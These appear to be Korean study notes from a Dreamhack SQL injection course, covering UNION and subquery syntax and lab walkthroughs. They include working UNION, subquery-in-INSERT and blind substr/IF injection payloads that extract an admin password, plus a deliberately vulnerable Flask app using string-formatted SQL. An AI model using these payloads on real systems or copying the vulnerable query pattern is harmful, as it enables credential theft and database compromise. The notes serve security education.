# 들어가며
---
[[ServerSide - SQL Injection|SQL Injection]] 공격을 사용하면 실행될 쿼리를 조작해 관리자 권한을 획득하고, 데이터베이스에 저장된 데이터를 획득할 수 있다. 

[[Background - 데이터베이스|데이터베이스]]는 데이터에 쉽게 접근할 수 있도록 다양한 문법을 지원한다. 예를 들어, 데이터를 조회할 때 두 개 이상의 쿼리를 함께 실행해 두 조건을 모두 만족하는 데이터만 가져올 수 있다. 이런 문법은 개발자 관점에서는 데이터에 접근할 때 훨씬 간편해지나, 문제는 공격자 입장에서도 더욱 다양한 조건으로 원하는 데이터를 검색할 수 있다. 

# SQL Features
---
## UNION
**UNION**은 다수의 `SELECT` 구문의 결과를 결합하는 절이다. 해당 절을 통해 다른 테이블에 접근하거나 원하는 쿼리 결과를 생성해 애플리케이션에서 처리하는 다른 데이터를 조작할 수 있으며, 이는 **애플리케이션이 데이터베이스 쿼리의 결과를 출력하는 경우 유용하게 사용할 수 있다.**

아래는 `UNION` 절의 사용 예시로, `username`과 `password` 컬럼에 각각 `"Dreamhack"`, `"Dreamhack PW"`가 일치하는 데이터를 조회하는 것을 알 수 있다. 

```sql
SELECT * FROM UserTable UNION SELECT "Dreamhack", "Dreamhack PW";
```

해당 구문을 사용할 때는 두 가지의 필수 조건을 만족해야 한다. 

- 이전 `SELECT` 구문과 `UNION`을 사용한 구문의 실행 결과 중 컬럼의 갯수가 동일해야 함
	- MySQL에서 두 구문의 결과 중 컬럼의 갯수가 다른 경우
	- ```sql
	  mysql> SELECT * FROM UserTable UNION SELECT "DreamHack", "DreamHack PW", "Third Column";
/*
ERROR 1222 (21000): The used SELECT statements have a different number of columns
*/
	  ```
- 특정 DBMS에서는 이전 `SELECT` 구문과 `UNION`을 사용한 구문의 컬럼 타입이 동일해야 함
	- MSSQL에서 두 구문의 컬럼 타입이 다른 경우
	- ```sql
	  # MSSQL (SQL Server)
SELECT 'ABC'
UNION SELECT 123;
/*
Conversion failed when converting the varchar value 'ABC' to data type int.
*/
	  ```

### UNION-based SQL Injection Lab
---
지금까지 배운 `UNION` 절의 내용을 토대로, `UNION`을 사용한 SQL Injection을 실습해본다.
[이 링크](https://learn.dreamhack.io/labs/79046f1c-3944-4ada-9481-f96e092d3988)를 열어 Lab 환경으로 갈 수 있다. 

해당 Lab에서 사용했던 SQL Injection의 코드는 다음과 같다. 

```
' UNION SELECT upw FROM user_table WHERE uid='admin' OR '
```

우리가 목표로 해야 하는 쿼리는 다음과 같다. 

```sql
SELECT upw FROM user_table WHERE uid='admin'
```

그런데, 기존 쿼리는 `SELECT uid FROM user_table WHERE uid='' and upw=''` 이므로, 해당 구문을 `UNION`을 사용해 기존 쿼리에 덧붙이며, 정상적인 쿼리로 동작하기 위해 맨 앞에 `'` 기호를 붙여 쿼리를 동작시킨다. 

또한, 두 번째 `SELECT` 구문에서 `WHERE uid='admin' OR '' and upw=''`라는 부분에 주목해야 하는데, 해당 구문은 다음 두 표현식의 결과를 `OR` 한 결과를 반환한다. 

- `uid='admin'`: `uid`가 `admin`인 데이터에 대해 참을 반환
- `'' and upw=''`: **MySQL에서 빈 문자열은 거짓을 의미**하기 때문에, 해당 구문은 언제나 거짓

따라서, 두 번째 `SELECT` 구문은 우리가 원하는 대로 동작하게 된다. 

## 서브 쿼리
**서브 쿼리 (Subquery)** 는 한 쿼리 내에 또 다른 쿼리를 사용하는 것을 말한다. 서브 쿼리를 사용하기 위해서는 **쿼리 내에서 괄호 안에 구문을 삽입**해야 하며, `SELECT` **구문만** 사용할 수 있다.

공격자는 서브 쿼리를 통해 쿼리가 접근하는 테이블이 아닌 다른 테이블에도 접근할 수 있으며, `SELECT` 구문을 사용하지 않는 쿼리에서 SQL Injection이 발생할 때 `SELECT` 구문을 쓸 수 있다.

아래는 서브 쿼리를 사용해 데이터를 조회한 모습이며, 서브 쿼리가 실행되어 456이 출력된다.

```sql
SELECT 1,2,3,(SELECT 456);

/*
+---+---+---+--------------+
| 1 | 2 | 3 | (SELECT 456) |
+---+---+---+--------------+
| 1 | 2 | 3 |          456 |
+---+---+---+--------------+
1 row in set (0.00 sec)
*/
```

### 서브 쿼리 사용 예시
---
**COLUMNS 절**
`SELECT` 구문의 컬럼 절에서 서브 쿼리를 사용할 때는 **단일 행**과 **단일 컬럼**이 반환되도록 해야 한다. 아래는 여러 개의 행과 컬럼을 반환하는 서브 쿼리를 실행한 모습으로, 결과를 살펴보면 여러 개의 행 또는 컬럼을 반환하며 에러가 발생하는 것을 확인할 수 있다. 

```sql
SELECT username, (SELECT "ABCD" UNION SELECT 1234) FROM users;
/* ERROR 1242 (21000): Subquery returns more than 1 row */

SELECT username, (SELECT "ABCD", 1234) FROM users;
/* ERROR 1241 (21000): Operand should contain 1 column(s) */
```

**FROM 절**
`FROM` 절에서 사용하는 서브 쿼리를 **인라인 뷰 (Inline View)** 라고 하며, 이는 여러 개의 행과 여러 개의 컬럼을 반환할 수 있다. 아래는 인라인 뷰로 여러 개의 행과 컬럼을 반환한 결과이다. 

```sql
SELECT * FROM (SELECT *, 1234 FROM users) as u;

/*
+----------+------+
| username | 1234 |
+----------+------+
| admin    | 1234 |
| guest    | 1234 |
+----------+------+
2 rows in set (0.00 sec)
*/
```

**WHERE 절**
`WHERE` 절에서 서브 쿼리를 사용하면 여러 개의 행을 반환하는 쿼리문을 실행할 수 있다. 아래는 `WHERE` 절에서 여러 개의 행을 반환한 결과이다. 

```sql
SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");

/*
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin    |
| guest    | guest    |
+----------+----------+
2 rows in set (0.00 sec)
*/
```

### Subquery-based SQL Injection Lab
---
지금까지 배운 서브 쿼리에 대한 내용을 토대로, 서브 쿼리를 사용한 SQL Injection을 실습해본다. [이 링크](https://learn.dreamhack.io/labs/baee1e1a-30d2-4dfa-8887-616b8dd914a2)를 열어 Lab 환경으로 갈 수 있다. 

해당 Lab에서의 쿼리는 `INSERT INTO board (name, text) VALUES ('', '')`으로 `SELECT`가 기본적으로 사용되지 않기 때문에, 서브 쿼리를 통해 `SELECT`를 사용해야 한다. 

우리가 해당 Lab에서 원하는 동작은 **`text`에 `user_table` 테이블의 `uid='admin'`에 해당하는 `upw` 값이 담긴 데이터를 삽입**하는 것이다. 따라서, 다음과 같은 순서로 코드를 작성할 수 있다. 

1. title 칸에다 작성하는 것이기 때문에, 처음에 `', `을 사용해 `text` 컬럼에 작성되도록 한다.
2. `user_table` 테이블에서 `uid='admin'`인 `upw`를 가져오는 `SELECT` 문을 작성한다.
3. 메인 쿼리는 `board` 테이블에서 작동하기 때문에, 괄호를 써서 서브 쿼리에서 `user_table`에서의 데이터를 가져온다. 
4. 해당 코드 외의 나머지 코드는 관심이 없기 때문에, `#`을 사용해 나머지는 주석 처리한다. 

해당 과정을 거쳐 만들어진 코드는 다음과 같다. 

```
', (SELECT upw FROM user_table WHERE uid='admin')) #'
```


## Application Logic
<u>SQL Injection은 애플리케이션 내부에서 사용하는 데이터베이스의 데이터를 조작하는 기법이다.</u> 만약, 특정한 쿼리를 실행했을 때 쿼리의 실행 결과가 애플리케이션에서 보여지지 않는다면? 그 때는 공격자 입장에서 데이터베이스의 정보를 추측하기 어렵다. 

이때는 [[ServerSide - SQL Injection]]에서 다룬 **Blind SQL Injection**과 마찬가지로, 애플리케이션의 동작 로직을 사용해 스무고개 하듯이 공격을 할 수 있다. 

특정한 번호의 게시물을 조회할 때 번호에 일치하는 게시물이 있다면 사용자에게 보여주고, 없다면 게시물이 존재하지 않는다는 메시지를 출력하는 애플리케이션이 있을 때, <u>공격자는 참과 거짓을 구분해 공격을 수행할 수 있다.</u>

아래는 Flask 프레임워크를 사용한 예제 Python 코드로, 인자로 전달된 `username`을 쿼리로 사용하면서 SQL Injection이 발생하며, 해당 쿼리의 결과로 `username`이 `'admin'`인 경우 참을, 아닌 경우 거짓을 반환한다. 

```python
from flask import Flask, request
import pymysql

app = Flask(__name__)

def getConnection():
	return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
	
	
@app.route('/', methods=['GET'])
def index():
	username = request.args.get('username')
	sql = "SELECT username FROM users WHERE username='%s'" %username
	conn = getConnection()
	curs = conn.cursor(pymysql.cursors.DictCursor)
	curs.execute(sql)
	
	rows = curs.fetchall()
	conn.close()
	
	if (rows[0]['username'] == 'admin'):
		return "True"
	else:
		return "False"
		
app.run(host='0.0.0.0', port=8000)
```

해당 로직에서 SQL Injection 취약점이 발생할 수 있으며, 다음 두 가지 방법으로 공격이 가능하다

### UNION을 사용한 공격
---
`UNION` 절을 사용하면 두 개의 `SELECT` 구문을 사용할 수 있기 때문에 참을 반환할 수 있다. 

아래는 SQL Injection으로 새로운 쿼리를 삽입한 모습이며, 공격 코드를 삽입하면 `UNION` 절에서 `"admin"`을 반환하기 때문에 애플리케이션에서 참을 반환한다.

```
/?username=' union select 'admin' -- -
==> True
```


### 비교 구문을 사용한 공격
---
위에서처럼 애플리케이션에서 `"admin"`을 반환해 관리자 권한으로 로그인하는 방법도 있지만, r관리자 계정의 비밀번호를 아예 알아내는 방법으로도 로그인할 수 있다. 

**SQL에서는 `IF`문으로 비교 구문을 만들 수 있다.** 따라서, 해당 구문으로 관리자 계정의 비밀번호를 한 글자씩 알아낼 수 있으며 아래는 비교 구문을 통해 관리자 계정의 비밀번호를 알아내는 공격 쿼리이다. 

```
/?username=' union select if(substr(password,1,1)='B', 'admin', 'not admin') from users where username='admin' -- -
==> False

/?username=' union select if(substr(password,1,1)='P', 'admin', 'not admin') from users where username='admin' -- -
==> True

/?username=' union select if(substr(password,2,1)='a', 'admin', 'not admin') from users where username='admin' -- -
==> True
```

참고로, `substr()` 함수가 어떤 의미이고, 어떤 역할을 하는지 궁금하면 [[Background - SQL DML]] 강의의 Lab에서 사용했으니, 보고 오자.


### Blind SQL Injection Lab
---
지금까지 배운 내용을 기반으로 Blind SQL Injection을 실습해본다. [이 링크](https://learn.dreamhack.io/labs/5c249803-825c-4c00-baee-ca70427ce084)를 열어 Lab 환경으로 갈 수 있다. 

먼저, 메인 쿼리를 살펴보면, `SELECT * FROM user_table WHERE uid='' and upw=''`으로, 기존의 SQL Injection 취약점을 실습했던 Lab에서의 쿼리와 동일하다. 

우리가 해당 Lab에서 원하는 동작은 Blind SQL Injection으로 `admin`의 비밀번호를 추출해 `admin`으로 로그인하는 것이며, 비밀번호는 **영어 소문자 & 과일 이름**으로 되어 있다. 

따라서, 다음과 같은 순서로 코드를 작성할 수 있다. 

1. uid 칸에만 코드를 작성한다. 
2. 대상으로 하는 데이터의 길이를 파악해야 하기 때문에, `length(upw)`로 SQL 구문 내에서 그 길이를 파악한다. 
3. `substr()` 함수를 사용해 한 글자씩 비교해가며 비밀번호를 추론한다. 

2번 과정에서 사용할 수 있는 코드는 다음과 같다. 

```
admin' AND length(upw)=(임의의 길이로, 때려맞춰야 함) #
```

이때, 괄호 안에는 임의의 숫자를 넣어야 한다. (실제로는 6을 넣었을 때 로그인이 되므로, `upw`의 길이는 6이라는 것을 확인할 수 있다)

이후, 3번 과정에서 사용할 수 있는 코드는 저번에 Blind SQL Injection에서 사용했던 것과 같다. 

```
admin' AND substr(upw, 1, 1) = 'a' // fail
admin' AND substr(upw, 1, 1) = 'b' // true
...

admin' AND substr(upw, 6, 1) = 'a' // true
```

따라서, Blind SQL Injection으로 알아낸 `admin`의 `upw`는 `banana`라는 것을 알 수 있었다. 


# 마치며
---
이번 강의에서는 SQL의 문법과 애플리케이션의 결과 처리 방식을 응용한 SQL Injection 공격을 배웠다. 특히, 애플리케이션에서 반환하는 값을 사용한 기법은 어려운 버전의 SQL Injection 공격을 수행할 때 자주 사용되므로, 강의에서 다뤘던 내용을 여러 번 복습해 보고 문제도 여러 개 풀어보는 것이 중요하다. 

SQL Injection은 문법을 응용한 공격 기법인 만큼, 다양한 SQL의 절을 사용해보면서 쿼리를 만들어보는 것이 매우 중요하다. 